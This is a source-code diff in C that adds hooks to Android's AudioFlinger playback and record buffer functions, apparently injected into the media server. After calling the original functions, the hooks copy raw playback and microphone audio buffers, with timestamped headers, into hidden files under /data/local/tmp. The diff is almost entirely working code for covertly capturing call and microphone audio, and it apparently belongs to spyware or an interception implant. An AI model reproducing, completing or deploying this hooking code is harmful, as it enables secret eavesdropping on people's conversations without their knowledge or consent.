@@ -15,14 +15,10 @@ static int fd = 0;
 static int fd_in = 0;
 static int fd_out = 0;
 
-/* signaling */
 struct cblk_t *cblkTracks = NULL;
+struct cblk_t *cblkRecordTracks = NULL;
 
-static int dumpOut = 0;
 
-#define MAX_CBLK 24
-static unsigned long cblk_array[MAX_CBLK];
-static unsigned long playbackLastBufferStartAddress_array[MAX_CBLK];
 
 
 
@@ -192,7 +188,210 @@ void* recordThread_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e, 
 }
 
 
+
+/* 
+   dumps from buffer->raw [1] to buffer->frameCount [2] * frameSize [3]
+   see status_t AudioFlinger::PlaybackThread::Track::getNextBuffer(AudioBufferProvider::Buffer* buffer, int64_t pts)
+   in AudioFlinger.cpp
+   
+
+*/
+void* playbackTrack_getNextBuffer2_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
+
+  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
+
+  void* result;
+  unsigned int* cblk_ptr;
+  unsigned int cblk;
+  unsigned long framesAvail;
+  unsigned long bufferSize;
+  unsigned long bufferStart;
+  unsigned long thisStart;
+  unsigned long bufferEndAddress;
+  unsigned int sampleRate;
+  struct timeval tv;
+  ssize_t res;
+  /* int ii, cblkIndex; */
+  unsigned int uintTmp;
+  struct cblk_t *cblk_tmp= NULL;
+  off_t headerStart = 0, positionTmp = 0;
+  time_t now;
+  int tt = 0xf;
+  
+  unsigned int bufferRaw = 0; 
+  unsigned int framesCount = 0;
+  unsigned int frameSize = 0;
+
+#ifdef DBG
+  log("\t\t\t------- playback2 -------------\n");
+#endif
+  
+  if( fd_out == 0) {
+    fd_out = open("/data/local/tmp/log_out" , O_RDWR , S_IRUSR | S_IRGRP | S_IROTH);
+  }
+
+  /* call the original function */
+  h_ptr = (void *) playbackTrack_getNextBuffer_hook.orig;
+  hook_precall(&playbackTrack_getNextBuffer_hook);
+  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
+   
+#ifdef DBG
+  log("\t\t\t\tresult: %d\n", (int) result);
+#endif
+
+  hook_postcall(&playbackTrack_getNextBuffer_hook);
+
+  /* fetch the necessary fields */
+  cblk_ptr = (unsigned int*) (a + 0x1c) ;
+  cblk = *cblk_ptr;
+#ifdef DBG
+  log("\t\t\tcblk %p\n", cblk);
+#endif
+
+  /* [3] */
+  frameSize = *(unsigned char*) (cblk + 0x34 );
+#ifdef DBG
+  log("\t\t\tframeSize %x\n", frameSize);
+#endif
+
+  // not really useful, info only
+  sampleRate = *(unsigned int*) (cblk + 0x30);
+#ifdef DBG
+  log("\t\t\tsampleRate %x\n", sampleRate);
+#endif
+
+  /* [2] second field within AudioBufferProvider */
+  framesCount = * (unsigned int*) (b + 4);
+#ifdef DBG
+  log("\t\t\tframesCount %x\n", framesCount);
+#endif
+
+  /* [1] first field (ptr) within AudioBufferProvider */
+  bufferRaw = *(unsigned int*) (b);
+  
+  // add the cblk to the tracks list, if
+  // we don't find it, it might be because
+  // the injection took place after the track
+  // was created
+  //log("start hash find\n");
+  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
+  
+  if( cblk_tmp == NULL ) {
+    cblk_tmp =  malloc( sizeof(struct cblk_t) );
+#ifdef DBG
+    log("cblk_tmp %x size %d\n", cblk_tmp, sizeof(cblk_tmp));
+#endif
+    cblk_tmp->cblk_index = cblk;
+    
+    cblk_tmp->lastBufferRaw  = bufferRaw;
+    cblk_tmp->lastFrameCount = framesCount;
+    cblk_tmp->lastFrameSize  = frameSize;
+    
+    cblk_tmp->streamType = 0xffff; // fake value
+    cblk_tmp->sampleRate = sampleRate;
+    
+    HASH_ADD_INT(cblkTracks, cblk_index, cblk_tmp);
+    cblk_tmp = NULL;
+    
+    HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
+    
+    if( cblk_tmp == NULL ) {
+#ifdef DBG
+      log("uthash shit happened\n");
+#endif
+      return result;
+    }
+
+#ifdef DBG
+    log("\t\tadded cblk from within getNextBuffer\n");
+#endif
+  } 
+  // otherwise dump from cblkb_tmp: buffer->raw [1] to buffer->frameCount [2] * frameSize [3]
+  // and update cblk_tmp
+  else {
+    
+
+    if( result == 0 && cblk_tmp->lastFrameCount != 0 ) { // aka NO_ERROR and cblk_tmp-last* contains valid pointers (see goto getNextBuffer_exit)
+
+      // header
+      headerStart = lseek(fd_out, 0, SEEK_CUR);
+      //log("\t\theaderStart: %x\n", headerStart);
+
+      uintTmp = 0xb00bb00b;
+      write(fd_out, &uintTmp, 4); // 1] cblk
+      write(fd_out, &uintTmp, 4); // 2] timestamp
+      write(fd_out, &uintTmp, 4); // 3] timestamp
+      write(fd_out, &uintTmp, 4); // 4] streamType
+      write(fd_out, &uintTmp, 4); // 5] sampleRate
+      write(fd_out, &uintTmp, 4); // 6] size of block
+
+#ifdef DBG
+      log("\t\t\tbuffer spans: %p -> %p\n", cblk_tmp->lastBufferRaw, (cblk_tmp->lastBufferRaw + cblk_tmp->lastFrameCount * cblk_tmp->lastFrameSize ) );
+#endif
+      res = write(fd_out, cblk_tmp->lastBufferRaw, cblk_tmp->lastFrameCount * cblk_tmp->lastFrameSize  );
+#ifdef DBG
+      log("\t\t\t\twrote: %d - expected: %d\n", res, cblk_tmp->lastFrameCount * cblk_tmp->lastFrameSize );
+#endif
+      positionTmp = lseek(fd_out, 0, SEEK_CUR);
+
+#ifdef DBG
+	log("\t\tfake header written: %x\n", positionTmp);
+#endif
+	
+      // if something is written fix the header
+      if( res > 0 ) {
+	// go back to start of header
+	lseek(fd_out, headerStart, SEEK_SET); 
+
+	//log("\t\trolled back: %x\n", lseek(fd_out, 0, SEEK_CUR));
+
+	// write the header
+	now = time(NULL);
+	tt = gettimeofday(&tv,NULL);
+	write(fd_out, &cblk_tmp->cblk_index , 4); // 1] cblk
+	write(fd_out, &tv.tv_sec , 4); // 2] timestamp
+	write(fd_out, &tv.tv_usec , 4); // 3] timestamp
+	write(fd_out, &cblk_tmp->streamType , 4); // 3] streamType
+	write(fd_out, &cblk_tmp->sampleRate , 4); // 4] sampleRate
+	write(fd_out, &res , 4); // 5] res
+	  
+#ifdef DBG
+	log("\t\t\theader fixed: %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, res);
+#endif
+	
+	// reposition the fd
+	lseek(fd_out, positionTmp, SEEK_SET);
+	//log("\t\trolled forward: %x\n", lseek(fd_out, 0, SEEK_CUR));
+      }
+      // otherwise remove the header, we don't need this block
+      else {
+	lseek(fd_out, headerStart, SEEK_SET);
+      }
+    
+    }
+
+    /* in both cases update cblk_tmp for the next run  */
+    cblk_tmp->lastBufferRaw  = bufferRaw;
+    cblk_tmp->lastFrameCount = framesCount;
+    cblk_tmp->lastFrameSize  = frameSize;
+
+  }
+
+#ifdef DBG 
+  log("\t\t\t------- end playback2 -------------\n");
+#endif
+
+  return result;
+
+
+  
+
+}
+
+
 void* playbackTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
+
+  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
 
   void* result;
   unsigned int* cblk_ptr;
@@ -203,27 +402,32 @@ void* playbackTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e,
   unsigned long bufferStart;
   unsigned long thisStart;
   unsigned long bufferEndAddress;
-  int res;
+  unsigned int sampleRate;
+  struct timeval tv;
+  ssize_t res;
   /* int ii, cblkIndex; */
-  unsigned long lr_var;
+  unsigned int uintTmp;
   struct cblk_t *cblk_tmp= NULL;
-
-
+  off_t headerStart = 0, positionTmp = 0;
+  time_t now;
+  int tt = 0xf;
+  
+  
   if( fd_out == 0) {
-    fd_out = open("/data/local/tmp/log_out" , O_RDWR | O_APPEND, S_IRUSR | S_IRGRP | S_IROTH);
+    fd_out = open("/data/local/tmp/log_out" , O_RDWR , S_IRUSR | S_IRGRP | S_IROTH);
   }
 
 
   log("\t\t\t------- playback -------------\n");
-  pause_h_ptr = (void *) playbackTrack_getNextBuffer_hook.orig;
+  h_ptr = (void *) playbackTrack_getNextBuffer_hook.orig;
   hook_precall(&playbackTrack_getNextBuffer_hook);
-  //log("\t\tcall %p\n", pause_h_ptr);
-  result = pause_h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
+  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
   log("\t\t\t\tresult: %d\n", (int) result);
   hook_postcall(&playbackTrack_getNextBuffer_hook);
 
   cblk_ptr = (unsigned int*) (a + 0x1c) ;
   cblk = *cblk_ptr;
+  sampleRate = *(unsigned int*) (cblk + 0x30);
   log("\t\t\tcblk %p\n", cblk);
   
   
@@ -240,6 +444,7 @@ void* playbackTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e,
     cblk_tmp->cblk_index = cblk;
     cblk_tmp->playbackLastBufferStartAddress = 0;
     cblk_tmp->streamType = 0xffff; // fake value
+    cblk_tmp->sampleRate = sampleRate;
     
     HASH_ADD_INT(cblkTracks, cblk_index, cblk_tmp);
     cblk_tmp = NULL;
@@ -254,7 +459,7 @@ void* playbackTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e,
 
 
 
-  bufferStart = (cblk + 0x40); // fix with offset within structure
+  bufferStart = *(unsigned long*) (cblk + 0x18); // fix with offset within structure
   
   // bufferSize is frameSize (0x34) * frameCount (0x1c)
   bufferSize = (*(unsigned char*) (cblk + 0x34 )) * ( *(unsigned long*) (cblk + 0x1c));
@@ -276,7 +481,52 @@ void* playbackTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e,
       
 	// dump from playbackLastBufferStartAddress to the end of the buffer)
 	log("\t\t\twrap dump: %p -> %p\n", cblk_tmp->playbackLastBufferStartAddress , bufferStart + bufferSize);
+
+        // header
+	headerStart = lseek(fd_out, 0, SEEK_CUR);
+	log("headerStart: %x\n", headerStart);
+
+	uintTmp = 0xb00bb00b;
+	write(fd_out, &uintTmp, 4); // 1] cblk
+	write(fd_out, &uintTmp, 4); // 2] timestamp
+	write(fd_out, &uintTmp, 4); // 3] timestamp
+	write(fd_out, &uintTmp, 4); // 4] streamType
+	write(fd_out, &uintTmp, 4); // 5] sampleRate
+	write(fd_out, &uintTmp, 4); // 6] size of block
+
+
 	res = write(fd_out, cblk_tmp->playbackLastBufferStartAddress , (bufferStart + bufferSize) - cblk_tmp->playbackLastBufferStartAddress  );
+	positionTmp = lseek(fd_out, 0, SEEK_CUR);
+
+	log("header written: %x\n", positionTmp);
+	
+	// if something is written fix the header
+	if( res > 0 ) {
+	  // go back to start of header
+	  lseek(fd_out, headerStart, SEEK_SET); 
+
+	  log("rolled back: %x\n", lseek(fd_out, 0, SEEK_CUR));
+
+	  // write the header
+	  now = time(NULL);
+	  tt = gettimeofday(&tv,NULL);
+	  write(fd_out, &cblk_tmp->cblk_index , 4); // 1] cblk
+	  write(fd_out, &tv.tv_sec , 4); // 2] timestamp
+	  write(fd_out, &tv.tv_usec , 4); // 3] timestamp
+	  write(fd_out, &cblk_tmp->streamType , 4); // 3] streamType
+	  write(fd_out, &cblk_tmp->sampleRate , 4); // 4] sampleRate
+	  write(fd_out, &res , 4); // 5] res
+	  
+	  log("\t\t\t-> header: %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, res);
+
+	  // reposition the fd
+	  lseek(fd_out, positionTmp, SEEK_SET);
+	  log("rolled forward: %x\n", lseek(fd_out, 0, SEEK_CUR));
+	}
+	// otherwise remove the header, we don't need this block
+	else {
+	  lseek(fd_out, headerStart, SEEK_SET);
+	}
 	log("\t\t\t\twrote: %d\n", res);
 
       }
@@ -284,7 +534,54 @@ void* playbackTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e,
       
 	// dump from playbackLastBufferStartAddress to thisStart)
 	log("\t\t\tdump from: %p -> %p\n", cblk_tmp->playbackLastBufferStartAddress, thisStart);
+
+	// header
+	
+	headerStart = lseek(fd_out, 0, SEEK_CUR);
+	log("headerStart: %x\n", headerStart);
+
+	uintTmp = 0xcaf1caf1;
+	write(fd_out, &uintTmp, 4); // 1] cblk
+	write(fd_out, &uintTmp, 4); // 2] timestamp
+	write(fd_out, &uintTmp, 4); // 3] timestamp
+	write(fd_out, &uintTmp, 4); // 4] streamType
+	write(fd_out, &uintTmp, 4); // 5] sampleRate
+	write(fd_out, &uintTmp, 4); // 6] size of block
+
+
 	res = write(fd_out, cblk_tmp->playbackLastBufferStartAddress , (thisStart) - cblk_tmp->playbackLastBufferStartAddress  );
+	positionTmp = lseek(fd_out, 0, SEEK_CUR);
+	
+	log("header written: %x\n", positionTmp);
+
+		// if something is written fix the header
+	if( res > 0 ) {
+	  // go back to start of header
+	  lseek(fd_out, headerStart, SEEK_SET); 
+	  log("rolled back: %x\n", lseek(fd_out, 0, SEEK_CUR));
+
+	  // write the header
+	  now = time(NULL);
+	  tt = gettimeofday(&tv,NULL);
+	  write(fd_out, &cblk_tmp->cblk_index , 4); // 1] cblk
+	  write(fd_out, &tv.tv_sec , 4); // 2] timestamp
+	  write(fd_out, &tv.tv_usec , 4); // 3] timestamp
+	  write(fd_out, &cblk_tmp->streamType , 4); // 4] streamType
+	  write(fd_out, &cblk_tmp->sampleRate , 4); // 5] sampleRate
+	  write(fd_out, &res , 4); // 6] res
+	  
+	  log("\t\t\t-> header: %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, res);
+
+	  // reposition the fd
+	  lseek(fd_out, positionTmp, SEEK_SET);
+	  log("rolled forward: %x\n", lseek(fd_out, 0, SEEK_CUR));
+	}
+	// otherwise remove the header, we don't need this block
+	else {
+	  lseek(fd_out, headerStart, SEEK_SET);
+	}
+
+
 	log("\t\t\t\twrote: %d\n", res);
       }
     
@@ -294,12 +591,220 @@ void* playbackTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e,
   } else {
     cblk_tmp->playbackLastBufferStartAddress = 0;
   }
- 
   
 
 
   return result;
 }
+
+
+/*
+  dumps from buffer->raw [1] to buffer->frameCount [2] * frameSize [3]
+  see AudioFlinger.cpp
+  
+ */
+void* recordTrack_getNextBuffer2_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
+
+  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
+
+  void* result;
+  unsigned long* cblk_ptr;
+  unsigned long cblk;
+  unsigned long framesAvail;
+  unsigned long framesReq;
+  unsigned long bufferSize;
+  unsigned long bufferStart;
+  unsigned long thisStart;
+  unsigned long bufferEndAddress;
+  int res;
+  unsigned long lr_var;
+  unsigned int sampleRate;
+  struct timeval tv;
+
+  unsigned int uintTmp;
+  struct cblk_t *cblk_tmp= NULL;
+  off_t headerStart = 0, positionTmp = 0;
+  time_t now;
+  int tt = 0xf;
+
+  unsigned int bufferRaw = 0; 
+  unsigned int framesCount = 0;
+  unsigned int frameSize = 0;
+
+
+  if( fd_in == 0) {
+    fd_in = open("/data/local/tmp/log_in" , O_RDWR , S_IRUSR | S_IRGRP | S_IROTH);
+  }
+
+#ifdef DBG
+  log("\t\t\t------ record2 --------------\n");
+#endif
+  
+  h_ptr = (void *) recordTrack_getNextBuffer_hook.orig;
+  hook_precall(&recordTrack_getNextBuffer_hook);
+  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
+
+#ifdef DBG
+  log("\t\t\t\tresult: %d\n", (int) result);
+#endif
+
+  hook_postcall(&recordTrack_getNextBuffer_hook);
+
+  cblk_ptr = (unsigned long*) (a + 0x1c) ;
+  cblk = *cblk_ptr;
+
+#ifdef DBG
+  log("\t\t\tcblk %p\n", cblk);
+#endif
+
+  /* [3] */
+  frameSize = *(unsigned char*) (cblk + 0x34 );
+#ifdef DBG
+  log("\t\t\tframeSize %x\n", frameSize);
+#endif
+
+  // not really useful, info only
+  sampleRate = *(unsigned int*) (cblk + 0x30);
+#ifdef DBG
+  log("\t\t\tsampleRate %x\n", sampleRate);
+#endif
+
+  /* [2] second field within AudioBufferProvider */
+  framesCount = * (unsigned int*) (b + 4);
+#ifdef DBG
+  log("\t\t\tframesCount %x\n", framesCount);
+#endif
+
+  /* [1] first field (ptr) within AudioBufferProvider */
+  bufferRaw = *(unsigned int*) (b);
+
+ // add the cblk to the tracks list, if
+  // we don't find it, it might be because
+  // the injection took place after the track
+  // was created
+  //log("start hash find\n");
+  HASH_FIND_INT( cblkRecordTracks, &cblk, cblk_tmp);
+  
+  if( cblk_tmp == NULL ) {
+    cblk_tmp =  malloc( sizeof(struct cblk_t) );
+#ifdef DBG
+    log("cblk_tmp %x size %d\n", cblk_tmp, sizeof(cblk_tmp));
+#endif
+    cblk_tmp->cblk_index = cblk;
+    
+    cblk_tmp->lastBufferRaw  = bufferRaw;
+    cblk_tmp->lastFrameCount = framesCount;
+    cblk_tmp->lastFrameSize  = frameSize;
+    
+    cblk_tmp->streamType = 0xffff; // fake value
+    cblk_tmp->sampleRate = sampleRate;
+    
+    HASH_ADD_INT(cblkRecordTracks, cblk_index, cblk_tmp);
+    cblk_tmp = NULL;
+    
+    HASH_FIND_INT( cblkRecordTracks, &cblk, cblk_tmp);
+    
+    if( cblk_tmp == NULL ) {
+#ifdef DBG
+      log("uthash shit happened\n");
+#endif
+      return result;
+    }
+
+#ifdef DBG
+    log("\t\tadded cblk from within getNextBuffer\n");
+#endif
+  } 
+  // otherwise dump from cblkb_tmp: buffer->raw [1] to buffer->frameCount [2] * frameSize [3]
+  // and update cblk_tmp
+  else {
+    
+
+    if( result == 0 && cblk_tmp->lastFrameCount != 0 ) { // aka NO_ERROR and cblk_tmp-last* contains valid pointers (see goto getNextBuffer_exit)
+
+      // header
+      headerStart = lseek(fd_in, 0, SEEK_CUR);
+
+#ifdef DBG      
+      log("\t\theaderStart: %x\n", headerStart);
+#endif
+
+      uintTmp = 0xdeaddead;
+      write(fd_in, &uintTmp, 4); // 1] cblk
+      write(fd_in, &uintTmp, 4); // 2] timestamp
+      write(fd_in, &uintTmp, 4); // 3] timestamp
+      write(fd_in, &uintTmp, 4); // 4] streamType
+      write(fd_in, &uintTmp, 4); // 5] sampleRate
+      write(fd_in, &uintTmp, 4); // 6] size of block
+
+#ifdef DBG
+      log("\t\t\tbuffer spans: %p -> %p\n", cblk_tmp->lastBufferRaw, (cblk_tmp->lastBufferRaw + cblk_tmp->lastFrameCount * cblk_tmp->lastFrameSize ) );
+#endif
+      res = write(fd_in, cblk_tmp->lastBufferRaw, cblk_tmp->lastFrameCount * cblk_tmp->lastFrameSize  );
+#ifdef DBG
+      log("\t\t\t\twrote: %d - expected: %d\n", res, cblk_tmp->lastFrameCount * cblk_tmp->lastFrameSize );
+#endif
+      positionTmp = lseek(fd_in, 0, SEEK_CUR);
+
+#ifdef DBG
+      log("\t\tfake header written: %x\n", positionTmp);
+#endif
+	
+      // if something is written fix the header
+      if( res > 0 ) {
+	// go back to start of header
+	lseek(fd_in, headerStart, SEEK_SET); 
+
+#ifdef DBG
+	log("\t\trolled back: %x\n", lseek(fd_in, 0, SEEK_CUR));
+#endif
+
+	// write the header
+	now = time(NULL);
+	tt = gettimeofday(&tv,NULL);
+	write(fd_in, &cblk_tmp->cblk_index , 4); // 1] cblk
+	write(fd_in, &tv.tv_sec , 4); // 2] timestamp
+	write(fd_in, &tv.tv_usec , 4); // 3] timestamp
+	write(fd_in, &cblk_tmp->streamType , 4); // 3] streamType
+	write(fd_in, &cblk_tmp->sampleRate , 4); // 4] sampleRate
+	write(fd_in, &res , 4); // 5] res
+	
+	  
+#ifdef DBG
+	log("\t\t\theader fixed: %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, res);
+#endif
+	
+	// reposition the fd
+	lseek(fd_in, positionTmp, SEEK_SET);
+#ifdef DBG
+	log("\t\trolled forward: %x\n", lseek(fd_in, 0, SEEK_CUR));
+#endif
+      }
+      // otherwise remove the header, we don't need this block
+      else {
+#ifdef DBG
+	log("\t\tremoving header\n");
+#endif 
+	lseek(fd_in, headerStart, SEEK_SET);
+      }
+    
+    }
+
+    /* in both cases update cblk_tmp for the next run  */
+    cblk_tmp->lastBufferRaw  = bufferRaw;
+    cblk_tmp->lastFrameCount = framesCount;
+    cblk_tmp->lastFrameSize  = frameSize;
+
+  }
+
+#ifdef DBG 
+  log("\t\t\t------- end record2 -------------\n");
+#endif
+
+
+  return result;
+}
+
 
 
 void* recordTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
@@ -316,8 +821,7 @@ void* recordTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e, v
   int res;
   unsigned long lr_var;
 
-  /* asm("mov %[lr], lr": [lr] "=r" (lr_var) ); */
-  /* log("\t\t\t\t\tlr: %x\n", lr_var); */
+
 
   if( fd_in == 0) {
     fd_in = open("/data/local/tmp/log_in" , O_RDWR | O_APPEND, S_IRUSR | S_IRGRP | S_IROTH);
@@ -336,7 +840,8 @@ void* recordTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e, v
   cblk = *cblk_ptr;
   log("\t\t\tcblk %p\n", cblk);
 
-  bufferStart = (cblk + 0x40); // fix with offset within structure
+  //bufferStart = (cblk + 0x40); // offset not fixed, follow the data structure instead
+  bufferStart = *(unsigned long*) (cblk + 0x18); 
   
   // bufferSize is frameSize (0x34) * frameCount (0x1c)
   bufferSize = (*(unsigned char*) (cblk + 0x34 )) * ( *(unsigned long*) (cblk + 0x1c));
@@ -409,7 +914,7 @@ void*  stepServer_h(void *a, void* b, void* c, void* d, void* e, void* f, void* 
   cblk_t = (unsigned long) a ; // start of cblk 
 
   /* if( rawBufferStart == 0) { */
-  rawBufferStart = cblk_t + 0x40;
+  rawBufferStart = cblk_t + 0x40; // FIXME
   log("\t\trawBufferStart is at %p\n", rawBufferStart);
   /* } */
 
@@ -476,7 +981,7 @@ void*  stepUser_h(void *a, void* b, void* c, void* d, void* e, void* f, void* g,
   cblk_t = (unsigned long) a ; // start of cblk 
 
   /* if( rawBufferStart == 0) { */
-  rawBufferStart = cblk_t + 0x40;
+  rawBufferStart = cblk_t + 0x40; //FIXME
   log("\t\trawBufferStart is at %p\n", rawBufferStart);
   /* } */
 
@@ -514,6 +1019,7 @@ void*  stepUser_h(void *a, void* b, void* c, void* d, void* e, void* f, void* g,
 
 
 
+
 void*  getBuffer_h(void *a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
   
   unsigned long result;
@@ -546,7 +1052,7 @@ void*  getBuffer_h(void *a, void* b, void* c, void* d, void* e, void* f, void* g
   r3 = *(unsigned long*) tmp ; // cblk is r3
 
   if( bufferStart == 0)
-    bufferStart = r3 + 0x40; // from dbg
+    bufferStart = r3 + 0x40; // from dbg -> FIXME
 
   r2 = *(unsigned long*) (r3 + 0x14);
   /* log("\t\tlast size , aka offset - cblk->serverbase: %d", b - r2); */
